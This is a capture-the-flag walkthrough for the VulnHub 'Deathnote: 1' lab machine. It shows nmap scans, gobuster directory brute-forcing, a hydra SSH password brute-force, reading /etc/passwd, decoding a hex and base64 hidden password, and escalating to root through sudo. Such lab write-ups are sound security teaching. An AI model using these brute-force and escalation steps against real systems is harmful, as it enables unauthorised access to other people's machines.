::::::::::::::::::::::::::::::::::::: page
# Deathnote: 1 {#deathnote-1 .title}

\

## 

## Deathnote: 1

- **[Deathnote: 1]{style="color:#663e0e;"}** :-

<!-- -->

- Download the machine :
  <https://www.vulnhub.com/entry/deathnote-1,739/>

![](images/849-1.png)

- Open ova file .
- Then click finish .
- Start the machine .

1.  [Network Scanning]{style="color:#3584e4;"} :

- Find the machine IP :

::: codebox
    nmap -sn 192.168.2.0/24
:::

![](images/849-2.png)

- Run nmap master command :

::: codebox
    nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.238
:::

![](images/849-3.png)

- Find available port in the machine ( Optional ) :

::: codebox
    nmap -v -p- 192.168.2.238
:::

- 

::: codebox
    nmap -sC -sV -A 192.168.2.238 
:::

- This command runs an aggressive scan and uses the http-enum script to
  identify potential CGI directories .

::: codebox
    nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.238
:::

![](images/849-4.png)

1.  [Web Enumeration]{style="color:#3584e4;"} :

- Entry in host file :

::: codebox
    nano /etc/hosts
:::

![](images/849-5.png)

- Visit the endpoints : <http://deathnote.vuln/wordpress/>
  <http://deathnote.vuln/robots.txt>
  <http://deathnote.vuln/wordpress/wp-login.php>

<!-- -->

- Go to /wordpress endpoint : <http://deathnote.vuln/wordpress/>

![](images/849-6.png)

- Clue found :

::: codebox
    kira
    iamjustic3
:::

- Now try to login wordpress :

::: codebox
    Username : kira
    Password : iamjustic3
:::

- <http://deathnote.vuln/wordpress/wp-login.php>

![](images/849-7.png)

- Successfully login the wordpress :
  <http://deathnote.vuln/wordpress/wp-admin/>

![](images/849-8.png)

- Now brute-force the directory and find the endpoints :

::: codebox
    gobuster dir -u http://deathnote.vuln/wordpress/ -w /usr/share/wordlists/dirb/common.txt -x txt -t 50
:::

![](images/849-9.png)

- Again brute-force the /wp-content to find the endpoints :

::: codebox
    gobuster dir -u http://deathnote.vuln/wordpress/wp-content -w /usr/share/wordlists/dirb/common.txt -x txt -t 50
:::

![](images/849-10.png)

- Visit the /uploads endpoints :
  <http://deathnote.vuln/wordpress/wp-content/uploads/>

![](images/849-11.png)

- Visit the folder and subfolder :
  <http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/>

![](images/849-12.png)

- Download the both files :

::: codebox
    wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt
:::

- 

::: codebox
    wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/user.txt
:::

![](images/849-13.png)

1.  [SSH Access]{style="color:#3584e4;"} :

- Run the ssh brute force command :

::: codebox
    hydra -L user.txt -P notes.txt deathnote.vuln ssh
:::

![](images/849-14.png)

- Found login username and password :

::: codebox
    Username : l
    Password : death4me
:::

- SSH login :

::: codebox
    ssh l@deathnote.vuln
:::

![](images/849-15.png)

- Check the file list :

::: codebox
    ls -lh
:::

- Read the file :

::: codebox
    cat user.txt
:::

![](images/849-16.png)

- Decode the value in brainfuck :
  <https://www.dcode.fr/brainfuck-language>

![](images/849-17.png)

- Decode value :

::: codebox
    i think u got the shell , but you wont be able to kill me -kira
:::

1.  [Privilege Escalation]{style="color:#3584e4;"} :

- Read the /etc/passwd file :

::: codebox
    cat /etc/passwd
:::

![](images/849-18.png)

- One more normal user found :

::: codebox
    Username : kira
:::

- Navigate the directory :

::: codebox
    cd /opt/L
:::

- Check the list and again navigate the directory :

::: codebox
    cd fake-notebook-rule/
:::

- Check the list :

::: codebox
    ls -lh
:::

- Found the 2 files :

![](images/849-19.png)

- Read the both files :

::: codebox
    cat case.wav
:::

- 

::: codebox
    cat hint
:::

![](images/849-20.png)

- In case.wav file we found the hex value :

::: codebox
    63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d
:::

- Decode the hex value :

::: codebox
    echo "6347467a6333646b49446f6761326c7959576c7a5a585a706243413d" | xxd -r -p
:::

![](images/849-21.png)

- Now decode the base64 value :

::: codebox
    echo "cGFzc3dkIDoga2lyYWlzZXZpbCA=" | base64 -d
:::

![](images/849-22.png)

- Found the password :

::: codebox
    passwd : kiraisevil
:::

- Now switch the other normal user :

::: codebox
    su kira 
:::

![](images/849-23.png)

- Check sudo Privileges :

::: codebox
    sudo -l
:::

- Now switch the sudo user :

::: codebox
    sudo su
:::

- Check the file list :

::: codebox
    ls -lh
:::

![](images/849-24.png)

- Read the root.txt file :

::: codebox
    cat root.txt
:::

- Found the root flag :

![](images/849-25.png)
:::::::::::::::::::::::::::::::::::::
